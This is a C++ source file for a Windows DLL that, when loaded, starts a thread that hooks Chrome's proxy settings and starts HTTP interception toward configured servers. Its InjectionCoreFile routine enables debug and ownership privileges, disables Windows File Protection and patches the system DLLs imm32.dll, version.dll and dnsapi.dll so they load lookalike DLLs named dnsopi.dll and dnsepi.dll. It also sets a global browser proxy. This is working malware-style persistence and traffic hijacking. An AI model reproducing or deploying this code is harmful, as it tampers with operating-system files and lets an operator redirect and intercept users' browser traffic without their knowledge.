#include <stdio.h>

#include "HTTPRedirect.h"
#include "HTTPSeclusion.h"
#include "HTTPReconnect.h"

#include "SetDll\SetDll_Inferface.h"
#include "HookControl\HookHelp.h"
#include "CommonControl\Commondef.h"
#include <ws2tcpip.h>

#pragma  comment(lib,"WS2_32.lib")

#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "SetDLL.lib")
#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "HookControl.lib")
#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "CommonControl.lib")

__declspec(dllexport) void _()
{

}

namespace Global {
	CDebug Log("HTTP_Redirect.log");
	CHTTPReconnect cHttpReconnect;
}

namespace FUN {
	FUN::__pfnGetCommandLineW GetCommandLineW = NULL;

	FUN::__pfnGetProcAddress GetProcAddress = (FUN::__pfnGetProcAddress)::GetProcAddress(GetModuleHandle(_T("Kernel32.dll")), "GetProcAddress");
}

const char * __inet_ntop(int af, in_addr src_addr, char *dst, socklen_t cnt)
{
	if (af == AF_INET)
	{
		struct sockaddr_in in;
		memset(&in, 0, sizeof(in));
		in.sin_family = AF_INET;
		memcpy(&in.sin_addr, &src_addr, sizeof(struct in_addr));
		getnameinfo((struct sockaddr *)&in, sizeof(struct sockaddr_in), dst, cnt, NULL, 0, NI_NUMERICHOST);
		return dst;
	}
	else if (af == AF_INET6)
	{
		struct sockaddr_in6 in;
		memset(&in, 0, sizeof(in));
		in.sin6_family = AF_INET6;
		memcpy(&in.sin6_addr, &src_addr, sizeof(struct in_addr6));
		getnameinfo((struct sockaddr *)&in, sizeof(struct sockaddr_in6), dst, cnt, NULL, 0, NI_NUMERICHOST);
		return dst;
	}
	return NULL;
}

const wchar_t * __inet_ntopw(int af, in_addr src_addr, wchar_t *dst, socklen_t cnt)
{
	if (af == AF_INET)
	{
		struct sockaddr_in in;
		memset(&in, 0, sizeof(in));
		in.sin_family = AF_INET;
		memcpy(&in.sin_addr, &src_addr, sizeof(struct in_addr));
		GetNameInfoW((struct sockaddr *)&in, sizeof(struct sockaddr_in), dst, cnt, NULL, 0, NI_NUMERICHOST);
		return dst;
	}
	else if (af == AF_INET6)
	{
		struct sockaddr_in6 in;
		memset(&in, 0, sizeof(in));
		in.sin6_family = AF_INET6;
		memcpy(&in.sin6_addr, &src_addr, sizeof(struct in_addr6));
		GetNameInfoW((struct sockaddr *)&in, sizeof(struct sockaddr_in6), dst, cnt, NULL, 0, NI_NUMERICHOST);
		return dst;
	}
	return NULL;
}

#define MAX_IP4_STRING_LEN		16
#define MAX_IP6_STRING_LEN		46

#define MAX_IP_STRING_LEN		MAX_IP6_STRING_LEN

typedef struct _BUSINESS_DATA {
	USHORT usPACServerProt;
	CHAR szPACServerIP[MAX_IP_STRING_LEN + 1];
	USHORT usEncodeSockProt;
	CHAR szEncodeSockIP[MAX_IP_STRING_LEN + 1];
}BUSINESS_DATA,* PBUSINESS_DATA;

BOOL EnablePrivilege(LPCTSTR lpszPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |
		TOKEN_QUERY | TOKEN_READ, &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPrivilegeName, &luid))
		return TRUE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;

	AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL);

	CloseHandle(hToken);

	return (GetLastError() == ERROR_SUCCESS);

}

void InjectionCoreFile() {
	char szTargetPath[MAX_PATH + 1] = { 0 };

	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	EnablePrivilege(SE_TAKE_OWNERSHIP_NAME, TRUE);

	//////////////////////////////////////////////////////////////////////////

	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
	}

	DisableWFP(szTargetPath);
	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);

	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
	}

	DisableWFP(szTargetPath);
	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);

	//////////////////////////////////////////////////////////////////////////

	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\dnsapi.dll"), szTargetPath, MAX_PATH)) {
		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\dnsapi.dll"));
	}

	DisableWFP(szTargetPath);
	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);

}

HANDLE WINAPI SetBusinessData(sockaddr_in * paddrPACSocket, sockaddr_in * paddrEncodeSocket)
{
	BUSINESS_DATA tbdBusinessData = { 0 };

	CHAR szBuffer[MAX_IP_STRING_LEN + 1] = { 0 };

	__inet_ntop(AF_INET, paddrPACSocket->sin_addr, szBuffer, MAX_IP_STRING_LEN);

	strcpy(tbdBusinessData.szPACServerIP, szBuffer);
	tbdBusinessData.usPACServerProt = ntohs(paddrPACSocket->sin_port);

	__inet_ntop(AF_INET, paddrEncodeSocket->sin_addr, szBuffer, MAX_IP_STRING_LEN);

	strcpy(tbdBusinessData.szEncodeSockIP, szBuffer);
	tbdBusinessData.usEncodeSockProt = ntohs(paddrEncodeSocket->sin_port);

	InjectionCoreFile();
	SetGlobalWebBrowserProxy(tbdBusinessData.szPACServerIP, tbdBusinessData.usPACServerProt);

	return Common::SetBufferToShareMap("GLOBAL_LINGPAO8_ENCODE_BUSINESS_DATA", &tbdBusinessData, sizeof(BUSINESS_DATA));
}

DWORD WINAPI StartBusiness_Thread(void *)
{
	PBUSINESS_DATA pBusinessData = NULL;
	CHAR szBuffer[MAX_IP_STRING_LEN + 1] = { 0 };
	WCHAR wszBuffer[MAX_IP_STRING_LEN + 1] = { 0 };

	if (false == Common::GetBufferToShareMap("GLOBAL_LINGPAO8_ENCODE_BUSINESS_DATA", (void**)&pBusinessData))
	{
		Global::Log.PrintA(LOGOutputs, "[% 5u] HTTP StartBusiness failed: %u", GetCurrentProcessId(), ::GetLastError());
		return -1;
	}

	Global::Log.PrintA(LOGOutputs, "[% 5u] PAC:(%s,%u)", GetCurrentProcessId(), pBusinessData->szPACServerIP, pBusinessData->usPACServerProt);

	Global::Log.PrintA(LOGOutputs, "[% 5u] ENCODE:(%s,%u)", GetCurrentProcessId(), pBusinessData->szEncodeSockIP, pBusinessData->usEncodeSockProt);

	//Global::cHttpReconnect.SetWebBrowserProxy(pcszProxyHost, usProxyPort); // 由于这种方式不能设置 PAC

	if (0 != pBusinessData->usEncodeSockProt)
	{
		sockaddr_in serv_addr = {0};

		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(pBusinessData->usEncodeSockProt);
		serv_addr.sin_addr.s_addr = inet_addr(pBusinessData->szEncodeSockIP);

		StartHTTPSeclusion(serv_addr);
	}

	if (0 != pBusinessData->usPACServerProt)	{
		Hook::StartChromeProxyConfigHook(Common::STR2WSTR(pBusinessData->szPACServerIP, wszBuffer), pBusinessData->usPACServerProt);
	}

	return 0;
}

DWORD WINAPI StartBusiness(void *)
{
	DWORD dwThreadId = 0;

	CloseHandle(CreateThread(NULL, 0, StartBusiness_Thread, NULL, 0, &dwThreadId));

	return dwThreadId;
}

BOOL APIENTRY DllMain(_In_ HINSTANCE hDllHandle, _In_ DWORD dwReason, _In_opt_ void * _Reserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		StartBusiness(NULL);
		break;
	case DLL_PROCESS_DETACH:
		break;
	default:
		break;
	}

	return TRUE;
}